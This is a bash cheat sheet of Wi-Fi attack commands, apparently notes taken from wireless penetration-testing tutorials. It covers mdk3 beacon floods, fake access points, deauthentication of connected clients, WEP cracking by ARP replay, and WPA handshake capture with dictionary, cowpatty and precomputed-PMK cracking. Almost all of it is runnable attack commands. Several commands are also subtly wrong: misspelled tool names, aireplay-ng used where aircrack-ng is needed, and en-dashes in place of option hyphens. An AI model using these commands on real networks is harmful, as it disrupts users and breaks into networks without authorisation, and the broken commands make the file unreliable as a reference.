#!/bin/bash

#----------------------------------------------------------------------------------------#
#	wifi hacking #
#----------------------------------------------------------------------------------------#


#----------------------------------------------------------------------------------------#
#	raw frame injection  #
#----------------------------------------------------------------------------------------#

# start monitor mode

airmon-ng start wlan0

# new wifi interface in monitor mode
# mon0


# test for raw frame injection
aireplay-ng -9 mon0

# mdk3 tool

mkd3 --fullhelp

# beacon flood mode

# get help by letter associated with attack

mkd3 --help b

mkd3 mon0 b -f ssid.list -g -a -c 11

# scan for network during beacon flood

ifconfig wlan0 

iwlist wlan0 scan | grep ESSID

#--------------------------------------------------------------------------------------#

# Beacon frames

# bring up network interface
ifconfig wlan0 up

# start monitor mode on channel 11
airmon-ng start wlan0 11


# create beacon frames with mdk3 for an essid 

mkd3 mon0 b -c 11 -n haktip

# b = beacon mode
# -c = channel
# -n = ssid name
# mon0 = network interface in monitor mode


# scan for network beacons

ifconfig wlan0 

iwlist wlan0 scan | grep ESSID

#----------------------------------------------------------------------------------------#
#	airbase-ng  #
#----------------------------------------------------------------------------------------#

# mimic wireless access points


airbase-ng --help

airbase-ng -c 11 -e haktip mon0

# -c = channel
# -e = essid
# mon0 = network interface in monitor mode


# check tap interface is created

ifconfig at0 up

# airbase-ng -c 11 -e haktip mon0 = will show a fake bssid copy to clipboard


# start wireshark

# in capture interfaces select mon0 and start

# capture a couple of packets and then stop to apply some filters


# apply filter to only show frames from our bssid
wlan.addr == 4C:OF:6E:95:3C:D3

# show only beacon frames
wlan.addr == 4C:OF:6E:95:3C:D3 && wlan.fc.type_subtype == 0x08


#----------------------------------------------------------------------------------------#
#	cowpaty  #
#----------------------------------------------------------------------------------------#

# put network interface into monitor mode
airmon-ng start wlan0

# start kismet
kismet -c RT8180.wlan0.ALFA


# things to get from a kismet scan
# network name
# bssid
# channel

# run airodump
airodump-ng -c 11 --bssid 00:09:5B:FF:4F:B6 -w NETGEAR_b wlan0

# -c = channel
# --bssid = bssid of the network we found
# -w = write the file out to NETGEAR_b
# wlan0 = our network interface


# 4 way handshake

# defauth client on the network to get the 4 way handshake

airplay-ng -0 30 -a 00:09:5B:FF:4F:B6 -c 00:22:69:08:70:11 wlan0

# -0 = deauth attack
# 30 = number of deauth packets
# -a 00:09:5B:FF:4F:B6 = the bssid of the wifi network
# -c 00:22:69:08:70:11 = address of client on the network
# wlan0 = our network interface


# cowpatty "rainbow tables" of routers

cowpaty -r NETGEAR_b-01.cap -d /path/to/rainbowtables/netgear.wpa -s NETGEAR

# -r NETGEAR_b-01.cap = packet capture file
# -d /path/to/rainbowtables/netgear.wpa = path to rainbow tables for router
# -s NETGEAR = wifi network

#--------------------------------------------------------------------------------------#




#----------------------------------------------------------------------------------------#
#	managed mode  #
#----------------------------------------------------------------------------------------#

iwconfig wlan0 mode managed

iwconfig wlan0 essid pineapple


#----------------------------------------------------------------------------------------#
#	adhoc mode  #
#----------------------------------------------------------------------------------------#

iwconfig wlan0 channeln 1 essid adhoc mode ad-hoc


#----------------------------------------------------------------------------------------#
#	monitor mode  #
#----------------------------------------------------------------------------------------#

airmon-ng start wlan0

tshark -i mon0


#----------------------------------------------------------------------------------------#
#	beacon frames  #
#----------------------------------------------------------------------------------------#

airmon-ng start wlan0

# create a list of access point names
cat << EOF > ssidlist.txt
- acess point name s go here
EOF

mdk3 mon0 b -f ssidlist.txt

#--------------------------------------------------------------------------------------#

# start wireshark
wireshark & disown

# listen on mon0 interface - after starting monitor mode with: airmon-ng start wlan0

# wireshark filter for beacon frames
wlan.fc.subtype == 0x08

#--------------------------------------------------------------------------------------#

# start monitor mode
airmon-ng start wlan0

# dump wireless traffic
airodump-ng mon0 -w outfile.txt


#--------------------------------------------------------------------------------------#

# connecting to an open access point

# start wireshark on wlan0

# silence the noise

# wireshark filter for a single address
wlan.addr == 00:c0:ca:54:51:ef and not wlan.fc.subtype == 0x08

# passive scan should not generate any frames
iw dev wlan0 scan passive | grep SSID


# active scan
iw wlan0 scan | grep SSID

# display only request by updating wireshark filter to include "and wlan.fc.subtype == 0x04"

# display only responses by changing 0x04 to 0x05

#--------------------------------------------------------------------------------------#


airmon-ng start wlan0

airodump-ng mon0

# find a channel for AP
iwconfig wlan0 channel 11

iwconfig mon0 channel 11

iwconfig wlan0 | grep Frequency
iwconfig wlan0 | grep Channel

wireshark & disown

#--------------------------------------------------------------------------------------#


# filter for AP and not just beacons
wlan.addr == 00:C0:CA:60:53:2E and not wlan.fc.subtype == 0x08

# associate

# filter for just phone and AP
wlan.addr == 00:C0:CA:60:53:2E and wlan.addr == a0:0b:ba:6a:ca

# probe request SSID=Broadcast = null probe request

# join the network
iwconfig wlan0 channel 11

iwconfig wlan0 mode managed

iwconfig wlan0 essid networkname

#--------------------------------------------------------------------------------------#

# deauthentication

airmon-ng start wlan0

# deauth phone

iwconfig mon0 channel 11

aireplay-ng -0 10 -a 00:C0:CA:60:53:2E -c a0:0b:ba:6a:ca mon0

# -0 10 = send 10 deauth frame
# -a 00:C0:CA:60:53:2E = access point 
# -c a0:0b:ba:6a:ca = client
# mon0 = wireless card in monitor mode


#----------------------------------------------------------------------------------------#
#	airdrop-ng  #
#----------------------------------------------------------------------------------------#

# begin demo connected to anything but pineapple

airodump-ng --output-format csv --write /root/dump.csv mon0

airdrop-ng -i mon0 -t /root/dump.csv-01.csv -r /root/droprules

# droprules syntax

a/00:C0:CA:60:53:2E|any
d/any|any

# mac address of pineapple 00:C0:CA:60:53:2E


#----------------------------------------------------------------------------------------#
#	cracking wep  #
#----------------------------------------------------------------------------------------#

airodump-ng mon0 -c 11 --bssid 00:21:91:D2:8E:25 -w keystream


# mon0 = network interface in monitor mode
# -c 11 = channel 11
# -bssid 00:21:91:D2:8E:25 = bssid address
# -w keystream = write out to file called keystream


# fake a shared key authentication - and conect to the network
aireplay-ng -1 0 -e networkname -y keystream-01-00-21-91-D2-8E-25.xor -a 00:21:91:D2:8E:25 -h aa:aa:aa:aa:aa:aa mon0

#--------------------------------------------------------------------------------------#

# start monitor mode
airmon-ng start wlan0 

# verify the mon0 interface has been created using iwconfig command
iwconfig

# scan for networks
airodump-ng mon0

# target one network and capture packets
airodump-ng –bssid 00:21:91:D2:8E:25 --channel 11 --write WEPCrackingDemo mon0 

# –bssid 00:21:91:D2:8E:25 = bssid of network
# --channel 11 = channel 11
# --write WEPCrackingDemo = ave the packets into a pcap file using the --write directive
# mon0 = netork interface in monitor mode

# open a new terminal window, use airplay-ng to capture ARP packets and inject them back into the network

airplay-ng -3 -b 00:21:91:D2:8e:25 -h 0:fb:42:d5:e4:01 mon0

# -3 = -3 option is for ARP replay
# -b 00:21:91:D2:8e:25 = BSSID of our network
# -h 0:fb:42:d5:e4:01 = -h specifies the client MAC address that we are spoofing
# mon0 = netork interface in monitor mode

# use aireplay-ng to crack the WEP key from the .cap file
aireplay-ng WEPCRackingDemo-01.cap

# Note that it is a good idea to have airodump-ng—collecting the WEP packets, 
# aireplay-ng—doing the replay attack, 
# and Aircrack-ng— attempting to crack the WEP key based on the captured packets, all at the same time.

#----------------------------------------------------------------------------------------#
#	WPA Cracking  #
#----------------------------------------------------------------------------------------#

# start monitor mode
airmon-ng start wlan0 

# verify the mon0 interface has been created using iwconfig command
iwconfig

# scan for networks
airodump-ng mon0

# target one network and capture packets
airodump-ng –bssid 00:21:91:D2:8E:25 –channel 11 –write WPACrackingDemo mon0

# deauthenticate
aireplay-ng --deauth 1 -a 00:21:91:D2:8E:25 mon0

# open up the cap file in Wireshark and view the four-way handshake
# The handshake packets are the ones whose protocol is EAPOL Key:

# dictionary location
# /pentest/passwords/wordlists/darc0de.lst

# use airplay-ng to crack the cap file with a wordlist
aireplay-ng WPACrackingDemo-01.cap -w /pentest/passwords/wordlists/darc0de.lst

# WPACrackingDemo-01.cap = cap file
# -w /pentest/passwords/wordlists/darc0de.lst = wordlist


#----------------------------------------------------------------------------------------#
#	pre-calculate the PMK and use it for WPA/WPA2 PSK cracking  #
#----------------------------------------------------------------------------------------#


# We can pre-calculate the PMK for a given SSID and wordlist using the genpmk tool
genpmk –f /pentest/passwords/wordlists/darkc0de.lst –d PMK-Wireless-Lab –s "Wireless Lab"


# We now create a WPA-PSK network with the passphrase sky sign 
# (present in the dictionary we used) and capture a WPA-handshake for that network. 

# example
cowpaty -d PMK-Wireless-Lab -s "Wireless Lab" -r WPACrackingDemo2-01.cap 


# In order to use these PMKs with aircrack-ng, we need to use a tool called airolib-ng.
# We will give it the options airolib-ng PMK-Aircrack --import cowpatty PMK-Wireless-Lab
# where PMK-Aircrack is the aircrack-ng compatible database to be created and PMK-Wireless-Lab
# is the genpmk compliant PMK database, which we had created previously:

airolib-ng PMK-Aircrack --import cowpatty PMK-Wireless-Lab

# We now feed this database to aircrack-ng and the cracking process speeds up remarkably. 
aircrack-ng –r PMK-Aircrack WPACrackingDemo2-01.cap

#--------------------------------------------------------------------------------------#

#----------------------------------------------------------------------------------------#
#	standard streams and wpa cracking  #
#----------------------------------------------------------------------------------------#

# john the ripper

# aircrack-ng needs 3 things

# 1 - bssid of access point

# 2 - packet capture file containing handshake

# 3 - wordlist

# pipe john the ripper incremental dictonary to aircrack-ng
john --incremental --stdout | aircrack-ng -b 00:01:3B:97:D0:02 -w /pentest/passwords/wordlists/darkc0de.lst victim-02.cap




